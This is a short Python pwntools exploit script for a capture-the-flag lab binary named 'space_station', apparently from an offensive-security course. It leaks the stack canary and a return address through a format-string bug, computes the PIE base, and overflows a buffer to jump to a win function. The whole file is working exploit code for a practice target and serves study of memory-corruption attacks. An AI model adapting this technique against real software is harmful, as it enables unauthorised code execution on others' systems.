from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13597

elf = ELF('/home/kali/Desktop/offsec/labs/lab2/challenges/02_space_station/space_station')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r


canary_offset = 72  #with gdb + cyclic (check rax)
rip_offset = 88

CANARY_IDX = 15 #with format string 

ret_addr_idx = 17 #with fs

r = conn()

r.recvuntil(b"Enter your astronaut ID: ")
r.sendline(f"%{CANARY_IDX}$lx_%{ret_addr_idx}$lx".encode())
leak = r.recvline().strip()

canary = int(leak.split(b"_")[0], 16)
log.info(f"canary = {canary:#x}")

main_addr_leak = int(leak.split(b"_")[1], 16)  #leak of main+62, that is the return address just after calling vuln
log.info(f"main+62_leak = {main_addr_leak:#x}")

main_62_offset = elf.sym.main + 62
pie_base = main_addr_leak - main_62_offset  #62 is the offset of the ret address in main
log.info(f"pie base = {pie_base:#x}")

#win_offset = 0x0000555555555275 - 0x0000555555554000    #from known PIE base in GDB
win_offset = elf.sym.win

win_addr = pie_base + win_offset
log.info(f"win addr = {win_addr:#x}, win_offset = {win_offset:#x}")


rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
rop_gadget_true = ret_gadget + pie_base #ret gadget is just the offset in pie

r.recvuntil(b"Submit your mission log: ")
payload = flat(
    b"A" * canary_offset,
    p64(canary),
    b"B" * (rip_offset - canary_offset - 8),
    p64(rop_gadget_true),
    p64(win_addr),
)
r.send(payload)
r.interactive()